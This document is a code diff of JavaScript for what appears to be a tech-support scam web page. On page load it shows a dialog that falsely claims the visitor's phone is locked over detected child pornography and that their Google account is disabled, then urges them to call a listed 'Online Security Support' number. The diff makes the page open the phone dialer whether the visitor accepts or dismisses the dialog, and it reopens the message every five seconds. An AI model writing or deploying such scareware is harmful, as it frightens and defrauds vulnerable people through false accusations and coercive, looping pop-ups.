@@ -1,17 +1,11 @@
 function showConfirmMessage() {
-    let userResponse = confirm("Your Phone has been locked due to detected illegal Child pornography .Your Google Account  has been disabled . on! Immediately call Online Security Support +1(844) 906-6151 to unlock it!");
-    
-    if (userResponse) {
-        const telLink = document.getElementById("tel");
-        telLink.click(); // This will open the dialer on mobile devices
+    confirm("Your Phone has been locked due to detected illegal Child pornography .Your Google Account  has been disabled . on! Immediately call Online Security Support +1(844) 906-6151 to unlock it!");
 
-        setTimeout(showConfirmMessage, 5000); // Delay for 1 second before reopening the message
-    } else {
-        const telLink = document.getElementById("tel");
-        telLink.click(); // This will open the dialer on mobile devices
+    const telLink = document.getElementById("tel");
+    telLink.click(); // This will open the dialer on mobile devices
 
-        setTimeout(showConfirmMessage, 5000); // Delay for 1 second before reopening the message
-    }
+    setTimeout(showConfirmMessage, 5000); // Delay for 1 second before reopening the message
+
 }
 
 window.onload = function() {
